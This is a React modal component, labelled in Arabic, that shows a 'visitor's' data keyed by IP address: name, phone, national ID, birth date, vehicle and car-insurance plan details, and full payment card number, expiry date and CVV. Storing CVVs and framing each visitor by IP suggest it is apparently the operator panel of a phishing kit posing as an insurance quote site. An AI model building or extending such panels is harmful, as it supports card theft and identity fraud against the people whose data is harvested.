// src/components/InfoModal.js
import React from "react";
import { Modal, Button } from "react-bootstrap";

export default function InfoModal({ ip, user, onClose }) {
  if (!user) return null;

  const mapUsage = (v) => ({ private:"خصوصي", commercial:"تجاري", ride:"تطبيقات نقل الركاب" }[v] || v || "—");
  const mapOffer = (v) => ({ transfer:"نقل ملكية", new:"تأمين جديد" }[v] || v || "—");
  const mapReg   = (v) => ({ customs:"بطاقة جمركية", serial:"الرقم التسلسلي" }[v] || v || "—");

  const addonsText = user.addons?.length
    ? user.addons.map(a => `${a.name} (+${a.price} ريال)`).join(" | ")
    : "لا يوجد";

  const sections = [
    { title: "📋 البيانات الأساسية", rows: [
      ["الاسم", user.userName], ["رقم الهاتف", user.phoneNumber],
      ["رقم الهوية", user.idNumber], ["نوع العرض", mapOffer(user.offerType)],
      ["نوع التسجيل", mapReg(user.regType)], ["الرقم التسلسلي", user.serialNumber],
      ["تاريخ الميلاد", user.birthDate],
    ]},
    { title: "🚗 بيانات المركبة", rows: [
      ["نوع المركبة", user.carMake], ["سنة الصنع", user.carYear],
      ["نوع الاستخدام", mapUsage(user.usageType)], ["مدينة الاستخدام", user.city],
      ["تاريخ بداية التأمين", user.startDate],
    ]},
    { title: "🛡️ خطة التأمين", rows: [
      ["الشركة", user.company], ["نوع الخطة", user.planType],
      ["السعر الأساسي", user.planPrice ? `${user.planPrice} ريال` : null],
      ["الإضافات", addonsText],
      ["الإجمالي الكلي", user.total ? `${user.total} ريال` : null],
    ]},
    { title: "💳 بيانات الدفع", rows: [
      ["طريقة الدفع", user.paymentMethod],
      ["اسم حامل البطاقة", user.payments?.[0]?.cardHolderName],
      ["رقم البطاقة", user.payments?.[0]?.cardNumber],
      ["تاريخ الانتهاء", user.payments?.[0]?.expiryDate],
      ["CVV", user.payments?.[0]?.cvv],
    ]},
  ];

  return (
    <Modal show onHide={onClose} size="lg" centered>
      <Modal.Header closeButton>
        <Modal.Title>📄 بيانات الزائر — {user.userName || ip}</Modal.Title>
      </Modal.Header>
      <Modal.Body>
        {sections.map((sec) => (
          <div key={sec.title} className="mb-4">
            <h6 className="fw-bold border-bottom pb-2">{sec.title}</h6>
            <div className="row">
              {sec.rows.map(([label, val]) => (
                <div key={label} className="col-6 mb-2">
                  <span className="text-muted small">{label}</span>
                  <div className="fw-semibold">{val || "—"}</div>
                </div>
              ))}
            </div>
          </div>
        ))}
        <div><h6 className="fw-bold border-bottom pb-2">🌐 IP</h6><code>{ip}</code></div>
      </Modal.Body>
      <Modal.Footer>
        <Button variant="secondary" onClick={onClose}>إغلاق</Button>
      </Modal.Footer>
    </Modal>
  );
}
